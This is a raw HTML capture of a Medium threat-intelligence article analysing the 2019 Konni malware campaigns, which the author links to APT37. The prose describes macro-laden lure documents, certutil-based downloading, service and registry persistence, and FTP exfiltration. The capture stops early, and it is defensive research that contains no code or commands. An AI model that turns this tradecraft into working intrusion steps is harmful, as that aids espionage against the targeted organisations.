1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" rel="noopener follow" href="/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" rel="noopener follow" href="/search?source=---top_nav_layout_nav----------------------------------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="e1aa" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">A Look Into Konni 2019 Campaign</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><a rel="noopener follow" href="/@DoronKarmi?source=post_page-----b45a0f321e9b--------------------------------"><div><div class="bm" aria-hidden="false"><div class="l ib ic by id ie"><div class="l fj"><img alt="Doron Karmi" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/2*u3JNIYOcE-R_QOB3kyY5tA.png" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></div></div></a><a href="https://medium.com/d-hunter?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><div class="ih ab fj"><div><div class="bm" aria-hidden="false"><div class="l ii ij by id ik"><div class="l fj"><img alt="d-hunter" class="l fd by br il cx" src="https://miro.medium.com/v2/resize:fill:48:48/1*v7qE3mVpxpXKKfAHIDIMMQ.png" width="24" height="24" loading="lazy" data-testid="publicationPhoto"/><div class="if by l br il fs n ig ft"></div></div></div></div></div></div></a></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="im ab q"><div class="ab q in"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b io ip bk"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" data-testid="authorName" rel="noopener follow" href="/@DoronKarmi?source=post_page-----b45a0f321e9b--------------------------------">Doron Karmi</a></p></div></div></div><span class="ir is" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b io ip du"><span><a class="it iu ah ai aj ak al am an ao ap aq ar ex iv iw" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F36b231b019fe&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;user=Doron+Karmi&amp;userId=36b231b019fe&amp;source=post_page-36b231b019fe----b45a0f321e9b---------------------post_header-----------">Follow</a></span></p></div></div></span></div></div><div class="l ix"><span class="bf b bg z du"><div class="ab cn iy iz ja"><div class="jb jc ab"><div class="bf b bg z du ab jd"><span class="je l ix">Published in</span><div><div class="l" aria-hidden="false"><a class="af ag ah ai aj ak al am an ao ap aq ar iq ab q" data-testid="publicationName" href="https://medium.com/d-hunter?source=post_page-----b45a0f321e9b--------------------------------" rel="noopener follow"><p class="bf b bg z jf jg jh ji jj jk jl jm bk">d-hunter</p></a></div></div></div><div class="h k"><span class="ir is" aria-hidden="true"><span class="bf b bg z du">·</span></span></div></div><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">11 min read</span><div class="jn jo l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Jan 4, 2020</span></div></span></div></span></div></div></div><div class="ab cp jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke"><div class="h k w fg fh q"><div class="ku l"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fd-hunter%2Fb45a0f321e9b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;user=Doron+Karmi&amp;userId=36b231b019fe&amp;source=-----b45a0f321e9b---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao la lq lr ab q fk ls lt" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lu"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q kf kg kh ki kj kk kl km kn ko kp kq kr ks kt"><div class="lv k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fb45a0f321e9b&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fd-hunter%2Fa-look-into-konni-2019-campaign-b45a0f321e9b&amp;source=-----b45a0f321e9b---------------------bookmark_footer-----------"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lw" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd lx cn"><div class="l ae"><div class="ab cb"><div class="ly lz ma mb mc md ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh mi mj mk ml s mm mn mo mp mq mr ms u mt mu mv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh mi mj mk ml s mm mn mo mp mq mr ms u mt mu mv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="b6e0" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Konni is a remote administration tool, observed in the wild since early 2014. The Konni malware family is potentially linked to <a class="af nu" href="https://attack.mitre.org/groups/G0067/" rel="noopener ugc nofollow" target="_blank">APT37</a>, a North-Korean cyber espionage group active since 2012. The group primary victims are South-Korean political organizations, as well as Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw nx"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*SYABUcSUSvyPqWAAqe7hMw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*SYABUcSUSvyPqWAAqe7hMw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*SYABUcSUSvyPqWAAqe7hMw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*SYABUcSUSvyPqWAAqe7hMw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*SYABUcSUSvyPqWAAqe7hMw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*SYABUcSUSvyPqWAAqe7hMw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SYABUcSUSvyPqWAAqe7hMw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*SYABUcSUSvyPqWAAqe7hMw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*SYABUcSUSvyPqWAAqe7hMw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*SYABUcSUSvyPqWAAqe7hMw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*SYABUcSUSvyPqWAAqe7hMw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*SYABUcSUSvyPqWAAqe7hMw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*SYABUcSUSvyPqWAAqe7hMw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*SYABUcSUSvyPqWAAqe7hMw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="353" loading="eager" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Map chart of APT37 main targets</figcaption></figure><p id="d73a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The latest activities leveraging the Konni malware family potentially target political organizations and politically motivated victims in Russia and South-Korea. During my research, I observed 3 distinct campaigns throughout 2019: starting from January to late September.</p><p id="4ef5" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Konni Infection chain consists of multiple stages and utilizes living-off-the-land binaries in its operation from the use of certutil.exe to download additional files and decode their content to sc.exe and reg.exe for persistence.</p><p id="85c9" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">These campaigns leverage similar C2 infrastructure for the delivery and a specific free FTP service used for exfiltration the stolen data from the affected targets. Additionally, the macro-armed lure documents used to deliver and install the Konni payloads have similarities across all 3 campaigns.</p><p id="4b09" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Konni is a modular malware that collects reconnaissance data on the target machine prior to sending further modules to the victim. We were unable to find additional operations related to the Konni malware family that might reveals further capabilities and malware types used by the group associated with Konni activity.</p><p id="72f5" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">During our analysis I found overlapping between the Konni infection chain, tools and technique used by the Syscon backdoor [<a class="af nu" href="https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/" rel="noopener ugc nofollow" target="_blank">1</a>] using a service called <em class="on">COMSysApp</em> to load the payload as a service DLL as a mean to achieve persistence on the victim machine. Although similarities have been observed between Konni and Syscon, at this time we can’t say with full certainty that the same threat actor is behind both operations.</p><h1 id="e024" class="oo op gu bf oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl bk">Campaign Timeline</h1><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw pm"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*uYEMeYkNdunD5RrlC87JNQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*uYEMeYkNdunD5RrlC87JNQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*uYEMeYkNdunD5RrlC87JNQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*uYEMeYkNdunD5RrlC87JNQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*uYEMeYkNdunD5RrlC87JNQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*uYEMeYkNdunD5RrlC87JNQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*uYEMeYkNdunD5RrlC87JNQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="206" loading="lazy" role="presentation"/></picture></div></div></figure><h1 id="94a4" class="oo op gu bf oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph pi pj pk pl bk">Execution flow</h1><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw pn"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*CfSltI6XAjK-X9tb9J2FvQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*CfSltI6XAjK-X9tb9J2FvQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*CfSltI6XAjK-X9tb9J2FvQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*CfSltI6XAjK-X9tb9J2FvQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*CfSltI6XAjK-X9tb9J2FvQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*CfSltI6XAjK-X9tb9J2FvQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CfSltI6XAjK-X9tb9J2FvQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*CfSltI6XAjK-X9tb9J2FvQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*CfSltI6XAjK-X9tb9J2FvQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*CfSltI6XAjK-X9tb9J2FvQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*CfSltI6XAjK-X9tb9J2FvQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*CfSltI6XAjK-X9tb9J2FvQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*CfSltI6XAjK-X9tb9J2FvQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*CfSltI6XAjK-X9tb9J2FvQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="388" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Typical Konni Execution Flow</figcaption></figure></div></div></div><div class="ab cb po pp pq pr" role="separator"><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h1 id="3af6" class="oo op gu bf oq or pw ot ou ov px ox oy oz py pb pc pd pz pf pg ph qa pj pk pl bk">Konni Multi-Stage Operation</h1><h2 id="236f" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Stage 1 — Initial Execution</h2><p id="c366" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">In mid-July 2019 I encountered with an emerging campaign delivering the Konni malware.</p><p id="055e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: “О ситуации на Корейском полуострове и перспективах диалога между США и КНДР” (translated to: About the situation on the Korean Peninsula and the prospect of a dialogue between the United States and the DPRK). Unlike the previously observed campaign, the August campaign potentially targeting Russian language speakers with an interest in Korean Geo-political situation, the lure document used in this campaign is written Cyrillic and contains content related to North Korean American foreign affairs.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw qv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*dooiijoRyJZnCoOZodqB0w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*dooiijoRyJZnCoOZodqB0w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*dooiijoRyJZnCoOZodqB0w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*dooiijoRyJZnCoOZodqB0w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*dooiijoRyJZnCoOZodqB0w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*dooiijoRyJZnCoOZodqB0w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dooiijoRyJZnCoOZodqB0w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 